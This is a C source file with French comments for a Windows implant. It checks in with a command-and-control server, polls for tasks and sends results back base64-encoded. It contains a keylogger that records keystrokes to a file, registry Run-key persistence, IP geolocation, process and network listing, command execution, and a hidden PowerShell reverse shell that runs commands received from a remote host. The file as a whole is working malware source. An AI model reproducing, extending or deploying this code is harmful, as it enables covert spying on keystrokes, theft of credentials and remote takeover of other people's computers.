#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <curl/curl.h>
#include <json-c/json.h>
#include <ctype.h>
#include <time.h>

#define OS "WINDOWS"
#define SLEEP_SECONDS(s) Sleep((s) * 1000)
#define JSON_BUFFER_SIZE 32768 // Taille augmentée pour éviter les dépassements

// Variables globales pour le keylogger et l'implant
static int keylogger_running = 0;
static char implant_uid[32] = {0};
static FILE *keylog_file = NULL;
static char keylog_filepath[MAX_PATH] = "keylog.txt";

// Callback pour récupérer la réponse HTTP
size_t write_callback(void *contents, size_t size, size_t nmemb, char *buffer) {
    size_t realsize = size * nmemb;
    strncat(buffer, (char *)contents, realsize);
    return realsize;
}

// Nettoyer une chaîne
void clean_string(char *str) {
    for (size_t i = 0; str[i] != '\0'; i++) {
        if (str[i] == '\n' || str[i] == '\r' || str[i] < 32 || str[i] > 126) str[i] = ' ';
    }
}

// Encoder en base64
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
char *base64_encode(const char *input) {
    size_t input_len = strlen(input);
    size_t output_len = 4 * ((input_len + 2) / 3);
    char *encoded = malloc(output_len + 1);
    if (!encoded) return NULL;

    size_t i, j;
    for (i = 0, j = 0; i < input_len;) {
        uint32_t octet_a = i < input_len ? (unsigned char)input[i++] : 0;
        uint32_t octet_b = i < input_len ? (unsigned char)input[i++] : 0;
        uint32_t octet_c = i < input_len ? (unsigned char)input[i++] : 0;

        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        encoded[j++] = base64_table[(triple >> 18) & 0x3F];
        encoded[j++] = base64_table[(triple >> 12) & 0x3F];
        encoded[j++] = base64_table[(triple >> 6) & 0x3F];
        encoded[j++] = base64_table[triple & 0x3F];
    }

    if (input_len % 3 == 1) {
        encoded[j - 2] = '=';
        encoded[j - 1] = '=';
    } else if (input_len % 3 == 2) {
        encoded[j - 1] = '=';
    }
    encoded[j] = '\0';
    return encoded;
}

// Exécuter une commande
char *execute_command(const char *cmd) {
    char buffer[8192] = {0};
    size_t buffer_len = 0;
    FILE *fp = _popen(cmd, "r");
    if (!fp) return strdup("Erreur : impossible d'exécuter la commande");

    while (fgets(buffer + buffer_len, sizeof(buffer) - buffer_len, fp)) {
        buffer_len = strlen(buffer);
    }
    _pclose(fp);
    clean_string(buffer);
    return strdup(buffer);
}

// Lire un fichier
char *read_file(const char *filepath) {
    FILE *fp = fopen(filepath, "rb");
    if (!fp) return strdup("Erreur : impossible d'ouvrir le fichier");

    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    if (file_size > 8192 - 1) file_size = 8192 - 1;
    char *buffer = malloc(file_size + 1);
    if (!buffer) {
        fclose(fp);
        return strdup("Erreur : allocation mémoire échouée");
    }

    size_t bytes_read = fread(buffer, 1, file_size, fp);
    buffer[bytes_read] = '\0';
    fclose(fp);
    clean_string(buffer);
    return buffer;
}

// Lister les processus
// Lister uniquement les noms des processus
// Lister les noms des processus sans doublons
char *list_processes() {
    char buffer[16384] = {0}; // Buffer pour stocker la liste
    size_t offset = 0;

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return strdup("Erreur : impossible de créer le snapshot des processus");
    }

    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return strdup("Erreur : échec de Process32First");
    }

    // Tableau dynamique pour stocker les noms uniques
    char **unique_names = NULL;
    int unique_count = 0;
    int process_count = 0;

    do {
        char proc_name[MAX_PATH] = "unknown";
        strncpy(proc_name, pe32.szExeFile, MAX_PATH - 1);
        proc_name[MAX_PATH - 1] = '\0';

        // Vérifier si le nom existe déjà
        int is_duplicate = 0;
        for (int i = 0; i < unique_count; i++) {
            if (strcmp(unique_names[i], proc_name) == 0) {
                is_duplicate = 1;
                break;
            }
        }

        // Si pas de doublon et limite non atteinte
        if (!is_duplicate && process_count < 150) {
            unique_names = realloc(unique_names, (unique_count + 1) * sizeof(char *));
            if (!unique_names) {
                CloseHandle(hProcessSnap);
                return strdup("Erreur : échec allocation mémoire pour noms uniques");
            }
            unique_names[unique_count] = strdup(proc_name);
            if (!unique_names[unique_count]) {
                CloseHandle(hProcessSnap);
                for (int i = 0; i < unique_count; i++) free(unique_names[i]);
                free(unique_names);
                return strdup("Erreur : échec allocation mémoire pour nom");
            }
            unique_count++;

            // Ajouter le nom au buffer
            offset += snprintf(buffer + offset, sizeof(buffer) - offset, "%s\n", proc_name);
            process_count++;
        }

        if (offset >= sizeof(buffer) - MAX_PATH) break; // Limite de taille du buffer
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    // Libérer la mémoire des noms uniques
    for (int i = 0; i < unique_count; i++) {
        free(unique_names[i]);
    }
    free(unique_names);

    clean_string(buffer);
    return strdup(buffer);
}
// Lister les sockets
char *list_sockets() {
    char buffer[8192] = {0};
    size_t offset = 0;

    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                       "Proto   Local Address          Foreign Address        State\n");

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return strdup("Erreur : échec de Winsock");

    PMIB_TCPTABLE2 pTcpTable = NULL;
    ULONG ulSize = 0;

    if (GetTcpTable2(pTcpTable, &ulSize, TRUE) == ERROR_INSUFFICIENT_BUFFER) {
        pTcpTable = (MIB_TCPTABLE2 *)malloc(ulSize);
        if (pTcpTable == NULL) {
            WSACleanup();
            return strdup("Erreur : allocation mémoire échouée");
        }
    }

    if (GetTcpTable2(pTcpTable, &ulSize, TRUE) == NO_ERROR) {
        for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
            char local_str[INET_ADDRSTRLEN], remote_str[INET_ADDRSTRLEN];
            struct in_addr local_addr, remote_addr;
            local_addr.S_un.S_addr = pTcpTable->table[i].dwLocalAddr;
            remote_addr.S_un.S_addr = pTcpTable->table[i].dwRemoteAddr;

            inet_ntop(AF_INET, &local_addr, local_str, sizeof(local_str));
            inet_ntop(AF_INET, &remote_addr, remote_str, sizeof(remote_str));

            const char *state_str;
            switch (pTcpTable->table[i].dwState) {
                case MIB_TCP_STATE_CLOSED: state_str = "CLOSED"; break;
                case MIB_TCP_STATE_LISTEN: state_str = "LISTEN"; break;
                case MIB_TCP_STATE_ESTAB: state_str = "ESTABLISHED"; break;
                case MIB_TCP_STATE_TIME_WAIT: state_str = "TIME_WAIT"; break;
                default: state_str = "UNKNOWN"; break;
            }

            offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                               "tcp     %s:%u          %s:%u         %s\n",
                               local_str, ntohs((u_short)pTcpTable->table[i].dwLocalPort),
                               remote_str, ntohs((u_short)pTcpTable->table[i].dwRemotePort), state_str);
        }
    } else {
        free(pTcpTable);
        WSACleanup();
        return strdup("Erreur : impossible de récupérer les connexions réseau");
    }

    free(pTcpTable);
    WSACleanup();
    clean_string(buffer);
    return strdup(buffer);
}

// Récupérer la localisation
char *get_location() {
    CURL *curl = curl_easy_init();
    if (!curl) return strdup("Erreur : échec de l'initialisation de curl");

    char buffer[8192] = {0};
    curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io/json");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, buffer);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) return strdup("Erreur : échec de la récupération de la localisation");

    struct json_object *parsed_json = json_tokener_parse(buffer);
    if (!parsed_json) return strdup("Erreur : impossible de parser la réponse JSON");

    struct json_object *loc_field, *city_field, *country_field;
    char result[256] = {0};
    const char *loc = "unknown", *city = "unknown", *country = "unknown";

    if (json_object_object_get_ex(parsed_json, "loc", &loc_field)) loc = json_object_get_string(loc_field);
    if (json_object_object_get_ex(parsed_json, "city", &city_field)) city = json_object_get_string(city_field);
    if (json_object_object_get_ex(parsed_json, "country", &country_field)) country = json_object_get_string(country_field);

    snprintf(result, sizeof(result), "Latitude/Longitude: %s (%s, %s)", loc, city, country);
    json_object_put(parsed_json);
    return strdup(result);
}

// Reverse shell avec PowerShell
char *send_reverse_shell(const char *lhost, int lport) {
    if (!lhost || lport <= 0 || lport > 65535) return strdup("Erreur : LHOST ou LPORT invalide");

    char ps_command[2048];
    snprintf(ps_command, sizeof(ps_command),
             "powershell -NoP -NonI -W Hidden -Command \""
             "$cl = New-Object System.Net.Sockets.TCPClient('%s',%d);"
             "$bloblo = $cl.GetStream();"
             "[byte[]]$blabla = 0..65535|%%{0};"
             "while(($i = $bloblo.Read($blabla, 0, $blabla.Length)) -ne 0){;"
             "$dodo = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($blabla,0, $i);"
             "$banana = (iex $dodo 2>&1 | Out-String );"
             "$banana2 = $banana;"
             "$dragon = ([text.encoding]::ASCII).GetBytes($banana2);"
             "$bloblo.Write($dragon,0,$dragon.Length);"
             "$bloblo.Flush()};"
             "$cl.Close()\"",
             lhost, lport);

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = GetStdHandle(STD_INPUT_HANDLE);

    BOOL success = CreateProcess(NULL, ps_command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!success) {
        return strdup("Erreur : échec de la création du processus PowerShell");
    }

    Sleep(1000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return strdup("Reverse shell PowerShell envoyé");
}

// Enregistrer les frappes dans le fichier
void log_keys_to_file() {
    if (!keylogger_running || !keylog_file) return;

    char timestamp[32];
    time_t now = time(NULL);
    strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S] ", localtime(&now));

    for (int key = 8; key <= 255; key++) {
        if (GetAsyncKeyState(key) & 0x8000) {
            char key_str[32];
            if (key >= 32 && key <= 126) {
                snprintf(key_str, sizeof(key_str), "%c", (char)(GetKeyState(VK_CAPITAL) & 0x0001 ? toupper(key) : tolower(key)));
            } else {
                switch (key) {
                    case VK_RETURN: strcpy(key_str, "[ENTER]\n"); break;
                    case VK_SPACE: strcpy(key_str, " "); break;
                    case VK_BACK: strcpy(key_str, "[BACKSPACE]"); break;
                    case VK_TAB: strcpy(key_str, "[TAB]"); break;
                    case VK_SHIFT: strcpy(key_str, "[SHIFT]"); break;
                    case VK_CONTROL: strcpy(key_str, "[CTRL]"); break;
                    case VK_MENU: strcpy(key_str, "[ALT]"); break;
                    case VK_CAPITAL: strcpy(key_str, "[CAPSLOCK]"); break;
                    case VK_ESCAPE: strcpy(key_str, "[ESC]"); break;
                    default: snprintf(key_str, sizeof(key_str), "[VK_%d]", key); break;
                }
            }
            fprintf(keylog_file, "%s%s", timestamp, key_str);
            fflush(keylog_file);
        }
    }
}

// Activer/Désactiver le keylogger
char *toggle_keylogger(const char *state, const char *filepath) {
    if (!state) return strdup("Erreur : état du keylogger non spécifié");

    if (strcmp(state, "true") == 0 || strcmp(state, "on") == 0) {
        if (keylogger_running) return strdup("Keylogger déjà activé");

        if (filepath && strlen(filepath) > 0) {
            strncpy(keylog_filepath, filepath, sizeof(keylog_filepath) - 1);
            keylog_filepath[sizeof(keylog_filepath) - 1] = '\0';
        }

        keylog_file = fopen(keylog_filepath, "a");
        if (!keylog_file) return strdup("Erreur : impossible d'ouvrir le fichier keylog");

        keylogger_running = 1;
        char result[MAX_PATH + 50];
        snprintf(result, sizeof(result), "Keylogger activé (fichier: %s)", keylog_filepath);
        return strdup(result);
    } else if (strcmp(state, "false") == 0 || strcmp(state, "off") == 0) {
        if (!keylogger_running) return strdup("Keylogger déjà désactivé");

        keylogger_running = 0;
        if (keylog_file) {
            fclose(keylog_file);
            keylog_file = NULL;
        }
        return strdup("Keylogger désactivé");
    }
    return strdup("Erreur : état invalide");
}

// Chemin de l'exécutable
char *get_executable_path() {
    char path[MAX_PATH];
    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) return strdup("Erreur : impossible de récupérer le chemin");
    return strdup(path);
}

// Persistance
char *toggle_persistence(const char *state) {
    char *exec_path = get_executable_path();
    if (strncmp(exec_path, "Erreur", 6) == 0) return exec_path;

    if (strcmp(state, "true") == 0 || strcmp(state, "on") == 0) {
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueEx(hKey, "MyImplant", 0, REG_SZ, (BYTE *)exec_path, strlen(exec_path) + 1);
            RegCloseKey(hKey);
            char result[MAX_PATH + 100];
            snprintf(result, sizeof(result), "Persistance activée (registre) avec %s", exec_path);
            free(exec_path);
            return strdup(result);
        }
    } else if (strcmp(state, "false") == 0 || strcmp(state, "off") == 0) {
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValue(hKey, "MyImplant");
            RegCloseKey(hKey);
        }
        free(exec_path);
        return strdup("Persistance désactivée");
    }
    free(exec_path);
    return strdup("Erreur : état invalide");
}

// Déplacer un fichier
char *move_file(const char *src, const char *dst) {
    if (rename(src, dst) == 0) return strdup("Fichier déplacé avec succès");
    return strdup("Erreur : impossible de déplacer le fichier");
}

// Supprimer un fichier
char *remove_file(const char *filepath) {
    if (remove(filepath) == 0) return strdup("Fichier supprimé avec succès");
    return strdup("Erreur : impossible de supprimer le fichier");
}

// Requête DECLARE
int perform_declare(CURL *curl, char *response, char *implant_uid_ptr, size_t implant_uid_size, char *username, char *hostname, char *os) {
    char json[8192];
    snprintf(json, sizeof(json), "{\"DECLARE\":{\"username\":\"%s\",\"hostname\":\"%s\",\"os\":\"%s\"}}", username, hostname, os);
    printf("JSON DECLARE envoyé : %s\n", json);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Erreur DECLARE : %s\n", curl_easy_strerror(res));
        return 0;
    }

    printf("Réponse DECLARE : %s\n", response);

    struct json_object *parsed_json = json_tokener_parse(response);
    if (!parsed_json) {
        fprintf(stderr, "Erreur : impossible de parser la réponse JSON DECLARE\n");
        return 0;
    }

    struct json_object *ok_field, *uid_field;
    if (json_object_object_get_ex(parsed_json, "OK", &ok_field) &&
        json_object_object_get_ex(ok_field, "UID", &uid_field)) {
        const char *uid = json_object_get_string(uid_field);
        if (uid) {
            strncpy(implant_uid_ptr, uid, implant_uid_size - 1);
            implant_uid_ptr[implant_uid_size - 1] = '\0';
            printf("Nouvel implant-uid reçu : %s\n", implant_uid_ptr);
            json_object_put(parsed_json);
            return 1;
        }
    }
    fprintf(stderr, "Erreur : échec de l'extraction de l'implant-uid\n");
    json_object_put(parsed_json);
    return 0;
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "Erreur : échec de l'initialisation de Winsock\n");
        return 1;
    }

    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Erreur : échec de l'initialisation de curl\n");
        WSACleanup();
        return 1;
    }

    curl_global_init(CURL_GLOBAL_ALL);
    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);

    char response[8192] = {0};
    int sleep_time = 5, jitter = 2, not_found_count = 0;

    char username[32], hostname[64], os[32] = OS;
    DWORD username_len = sizeof(username);
    GetUserName(username, &username_len);
    DWORD hostname_len = sizeof(hostname);
    GetComputerName(hostname, &hostname_len);

    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    if (!perform_declare(curl, response, implant_uid, sizeof(implant_uid), username, hostname, os)) {
        fprintf(stderr, "Échec du DECLARE initial\n");
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        WSACleanup();
        return 1;
    }

    // Remplacer la boucle while (1) dans main() par ceci :
    while (1) {
        memset(response, 0, sizeof(response));
        char *json = malloc(JSON_BUFFER_SIZE);
        if (!json) {
            fprintf(stderr, "Erreur : échec allocation mémoire JSON\n");
            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
            continue;
        }
        json[0] = '\0';

        snprintf(json, JSON_BUFFER_SIZE, "{\"FETCH\":\"%s\"}", implant_uid);
        printf("JSON FETCH envoyé : %s\n", json);

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "Erreur FETCH : %s\n", curl_easy_strerror(res));
            free(json);
            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
            continue;
        }

        printf("Réponse FETCH : %s\n", response);

        struct json_object *parsed_json = json_tokener_parse(response);
        if (!parsed_json) {
            fprintf(stderr, "Erreur : impossible de parser la réponse JSON FETCH\n");
            free(json);
            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
            continue;
        }

        struct json_object *error_field, *task_uid_field, *action_field;
        char *task_uid = NULL, *result = NULL;

        if (json_object_object_get_ex(parsed_json, "error", &error_field)) {
            const char *error_msg = json_object_get_string(error_field);
            printf("Erreur FETCH : %s\n", error_msg);
            if (strcmp(error_msg, "NotFound") == 0) {
                not_found_count++;
                if (not_found_count >= 50) {
                    printf("Trop d'erreurs NotFound, réessai de DECLARE...\n");
                    memset(implant_uid, 0, sizeof(implant_uid));
                    memset(response, 0, sizeof(response));
                    if (!perform_declare(curl, response, implant_uid, sizeof(implant_uid), username, hostname, os)) {
                        fprintf(stderr, "Échec du DECLARE, arrêt\n");
                        json_object_put(parsed_json);
                        curl_slist_free_all(headers);
                        curl_easy_cleanup(curl);
                        curl_global_cleanup();
                        WSACleanup();
                        return 1;
                    }
                    not_found_count = 0;
                }
            }
            json_object_put(parsed_json);
            free(json);
            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
            continue;
        }

        not_found_count = 0;

        if (json_object_object_get_ex(parsed_json, "task_uid", &task_uid_field) &&
            json_object_object_get_ex(parsed_json, "action", &action_field)) {
            task_uid = strdup(json_object_get_string(task_uid_field));

            struct json_object *ps_field;
            if (json_object_object_get_ex(action_field, "PS", &ps_field)) {
                result = list_processes();
                printf("Résultat PS : %s\n", result);
            } else {
                result = strdup("Erreur : tâche non reconnue");
            }

            if (result) {
                char *encoded_result = base64_encode(result);
                if (!encoded_result) {
                    fprintf(stderr, "Erreur : échec de l'encodage en base64\n");
                    free(result);
                    free(task_uid);
                    json_object_put(parsed_json);
                    free(json);
                    SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
                    continue;
                }

                // Construire le JSON avec json-c
                struct json_object *result_obj = json_object_new_object();
                json_object_object_add(result_obj, "agent_uid", json_object_new_string(implant_uid));
                json_object_object_add(result_obj, "task_uid", json_object_new_string(task_uid));
                json_object_object_add(result_obj, "output", json_object_new_string(encoded_result));

                const char *json_str = json_object_to_json_string_ext(result_obj, JSON_C_TO_STRING_PLAIN);
                size_t json_len = strlen(json_str);
                if (json_len >= JSON_BUFFER_SIZE - 1) {
                    fprintf(stderr, "Erreur : JSON trop grand (%zu octets), troncature forcée\n", json_len);
                    snprintf(json, JSON_BUFFER_SIZE, "{\"agent_uid\":\"%s\",\"task_uid\":\"%s\",\"output\":\"Erreur : liste trop longue\"}", implant_uid, task_uid);
                } else {
                    strncpy(json, json_str, JSON_BUFFER_SIZE - 1);
                    json[JSON_BUFFER_SIZE - 1] = '\0';
                }

                printf("JSON RESULT envoyé : %s\n", json);

                // Vérifier la connectivité avant envoi
                CURL *test_curl = curl_easy_init();
                if (test_curl) {
                    curl_easy_setopt(test_curl, CURLOPT_URL, "http://127.0.0.1:8000/api");
                    curl_easy_setopt(test_curl, CURLOPT_NOBODY, 1L); // HEAD request pour tester
                    curl_easy_setopt(test_curl, CURLOPT_TIMEOUT, 5L);
                    res = curl_easy_perform(test_curl);
                    if (res != CURLE_OK) {
                        fprintf(stderr, "Erreur : serveur inaccessible avant RESULT : %s\n", curl_easy_strerror(res));
                    } else {
                        printf("Serveur accessible avant RESULT\n");
                    }
                    curl_easy_cleanup(test_curl);
                }

                // Envoi de la requête RESULT
                curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
                curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
                long http_code = 0;
                printf("Début envoi requête RESULT...\n");
                memset(response, 0, sizeof(response));
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
                res = curl_easy_perform(curl);
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
                if (res != CURLE_OK) {
                    fprintf(stderr, "Erreur RESULT : %s (Code HTTP : %ld)\n", curl_easy_strerror(res), http_code);
                } else {
                    printf("Réponse RESULT : %s (Code HTTP : %ld)\n", response, http_code);
                }
                printf("Fin envoi requête RESULT\n");

                json_object_put(result_obj);
                free(encoded_result);
                free(result);
                free(task_uid);
            } else {
                fprintf(stderr, "Erreur : aucun résultat généré pour la tâche\n");
                free(task_uid);
            }
        }
        json_object_put(parsed_json);
        free(json);

        log_keys_to_file();
        SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
    }


    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    WSACleanup();
    if (keylog_file) fclose(keylog_file);
    return 0;
}
